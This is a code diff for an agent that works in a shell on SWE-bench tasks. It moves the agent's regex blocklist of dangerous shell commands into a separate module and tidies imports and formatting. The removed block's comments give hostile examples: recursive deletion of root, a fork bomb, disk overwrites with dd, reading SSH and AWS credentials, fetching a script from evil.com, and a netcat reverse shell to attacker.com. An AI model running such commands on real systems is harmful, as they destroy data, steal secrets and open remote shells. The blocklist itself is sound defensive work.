@@ -35,15 +35,17 @@ from dataclasses import dataclass
 from pathlib import Path
 
 from git.exc import GitCommandError
-from langchain_core.messages import AIMessage, HumanMessage, SystemMessage
+from langchain_core.messages import AIMessage
+from langchain_core.messages import HumanMessage
+from langchain_core.messages import SystemMessage
 from rich.console import Console
 
 from nat.builder.builder import Builder
 from nat.builder.framework_enum import LLMFrameworkEnum
 from nat.data_models.swe_bench_model import SWEBenchInput
-
 from nat_swe_bench.config import SweBenchWorkflowConfig
 from nat_swe_bench.predictors.predict_abc import SweBenchPredictorBase
+from nat_swe_bench.predictors.predict_iterative.shell_validation import validate_command
 from nat_swe_bench.predictors.predictor_registry import register_predictor
 
 logger = logging.getLogger(__name__)
@@ -83,123 +85,17 @@ class IterativeAgentConfig:
     max_output_length: int = 10000
 
 
-# Dangerous command patterns that should be blocked for security.
-# Each tuple contains (compiled_regex, error_message).
-DANGEROUS_PATTERNS: list[tuple[re.Pattern, str]] = [
-    # ===== Destructive system commands =====
-    # Examples: "rm -rf /", "rm -rf ~", "rm -fr /"
-    (re.compile(r'\brm\s+(-[^\s]*\s+)*[/~](\s|$)'),
-     "Deleting root or home directory is not allowed"),
-
-    # Examples: "rm -rf ..", "rm -rf ../important"
-    (re.compile(r'\brm\s+(-[^\s]*\s+)*\.\.'),
-     "Deleting parent directory is not allowed"),
-
-    # Examples: "rm -rf *", "rm -rf ./*"
-    (re.compile(r'\brm\s+(-[^\s]*\s+)*\*'),
-     "Wildcard deletion is not allowed"),
-
-    # Examples: "> /dev/sda", "echo x > /dev/mem" (allows /dev/null)
-    (re.compile(r'>\s*/dev/(?!null)'),
-     "Writing to device files is not allowed"),
-
-    # Examples: "mkfs.ext4 /dev/sda", "mkfs -t ext4 /dev/sda1"
-    (re.compile(r'\bmkfs\b'),
-     "Formatting disks is not allowed"),
-
-    # Examples: "fdisk /dev/sda", "fdisk -l /dev/nvme0n1"
-    (re.compile(r'\bfdisk\b'),
-     "Disk partitioning is not allowed"),
-
-    # Examples: "dd if=/dev/zero of=/dev/sda", "dd of=/dev/nvme0n1"
-    (re.compile(r'\bdd\s+.*\bof=/dev/'),
-     "Writing to devices with dd is not allowed"),
-
-    # Examples: "dd if=/dev/sda of=disk.img" (reading sensitive disk data)
-    (re.compile(r'\bdd\s+.*\bif=/dev/'),
-     "Reading from devices with dd is not allowed"),
-
-    # Fork bomb: :(){ :|:& };:
-    (re.compile(r':\(\)\s*\{\s*:\|:&\s*\}\s*;:'),
-     "Fork bomb detected"),
-
-    # ===== Privilege escalation =====
-    # Examples: "sudo rm -rf /", "echo pwd | sudo -S cmd", "/usr/bin/sudo cmd"
-    (re.compile(r'(?:^|[;&|`]\s*)(?:/usr/bin/)?sudo\b'),
-     "sudo is not allowed"),
-
-    # Examples: "doas rm file", "/usr/bin/doas cmd"
-    (re.compile(r'(?:^|[;&|`]\s*)(?:/usr/bin/)?doas\b'),
-     "doas is not allowed"),
-
-    # Examples: "pkexec rm file", "pkexec /bin/bash"
-    (re.compile(r'(?:^|[;&|`]\s*)(?:/usr/bin/)?pkexec\b'),
-     "pkexec is not allowed"),
-
-    # Examples: "su root", "su - admin", "su -c 'command' user"
-    (re.compile(r'(?:^|[;&|`]\s*)su\s+(-[^\s]*\s+)*\w'),
-     "su is not allowed"),
-
-    # Examples: "chmod 777 /", "chmod -R 0777 /var"
-    (re.compile(r'\bchmod\s+[0-7]*777\b'),
-     "Setting 777 permissions is not allowed"),
-
-    # Examples: "chown root file", "chown root:root /etc/passwd"
-    (re.compile(r'\bchown\s+root\b'),
-     "Changing ownership to root is not allowed"),
-
-    # ===== Sensitive file access =====
-    # Examples: "cat /etc/shadow", "> /etc/passwd", "< /etc/sudoers"
-    (re.compile(r'[<>]\s*/etc/(?:passwd|shadow|sudoers)'),
-     "Accessing sensitive system files is not allowed"),
-
-    # Examples: "cat ~/.ssh/id_rsa", "cat /home/user/.aws/credentials"
-    (re.compile(r'\bcat\s+.*/(?:\.ssh/|\.aws/|\.env\b)'),
-     "Reading sensitive credential files is not allowed"),
-
-    # ===== Arbitrary code download and network exfiltration =====
-    # Examples: "wget http://evil.com/malware.sh", "wget https://x.com/script"
-    (re.compile(r'\bwget\s+.*https?://'),
-     "Downloading from URLs with wget is not allowed"),
-
-    # Examples: "curl http://evil.com/script.sh", "curl -O https://..."
-    (re.compile(r'\bcurl\s+.*https?://'),
-     "Downloading from URLs with curl is not allowed"),
-
-    # Examples: "nc -e /bin/bash 10.0.0.1 4444", "ncat -e cmd attacker.com"
-    (re.compile(r'\b(?:nc|ncat|netcat)\b.*\s-[^\s]*e'),
-     "Netcat reverse shell is not allowed"),
-]
-
-
-def validate_command(command: str) -> tuple[bool, str]:
-    """Validate that a command is safe to execute.
-
-    Args:
-        command: The bash command string to validate.
-
-    Returns:
-        A tuple of (is_valid, error_message).
-        is_valid is True if the command passes all safety checks.
-        error_message is empty string if valid, otherwise describes the violation.
-    """
-    for pattern, message in DANGEROUS_PATTERNS:
-        if pattern.search(command):
-            return False, message
-    return True, ""
-
-
 class IterativeAgent:
     """Iterative agent that executes commands step-by-step."""
 
-    # Timeout message template 
+    # Timeout message template
     _TIMEOUT_TEMPLATE = (
         "The last command <command>{action}</command> timed out and has been killed.\n"
         "The output of the command was:\n <output>\n{output}\n</output>\n"
         "Please try another command and make sure to avoid those requiring interactive input."
     )
 
-    # Output truncation warning message 
+    # Output truncation warning message
     _OUTPUT_TRUNCATION_WARNING = (
         "\n<warning>\n"
         "The output of your last command was too long.\n"
@@ -234,17 +130,17 @@ class IterativeAgent:
             msg = SystemMessage(content=content)
             self.messages.append(msg)
             console.print(f"\n[bold blue]System[/bold blue] (step {self.n_steps}):\n", end="", highlight=False)
-        elif role == "user" or role == "human":
+        elif role in ("user", "human"):
             msg = HumanMessage(content=content)
             self.messages.append(msg)
             console.print(f"\n[bold green]User[/bold green] (step {self.n_steps}):\n", end="", highlight=False)
-        elif role == "assistant" or role == "ai":
+        elif role in ("assistant", "ai"):
             msg = AIMessage(content=content)
             self.messages.append(msg)
             console.print(f"\n[bold red]Assistant[/bold red] (step {self.n_steps}):\n", end="", highlight=False)
         else:
             raise ValueError(f"Unknown role: {role}")
-        
+
         # Print content
         console.print(content, highlight=False, markup=False)
 
@@ -260,7 +156,7 @@ class IterativeAgent:
         """
         # Convert Path to string for template usage
         repo_path_str = str(repo_path)
-        
+
         system_template = """You are a helpful assistant that can interact multiple times with a computer shell to solve programming tasks.
 Your response must contain exactly ONE bash code block with ONE command (or commands connected with && or ||).
 
@@ -564,7 +460,8 @@ You cannot continue working (reading, editing, testing) in any way on this task 
                 stderr=subprocess.STDOUT,  # stderr redirected to stdout
                 text=True,
                 encoding="utf-8",
-                errors="replace"
+                errors="replace",
+                check=False,  # Don't raise on non-zero exit; we handle return codes manually
             )
 
         try:
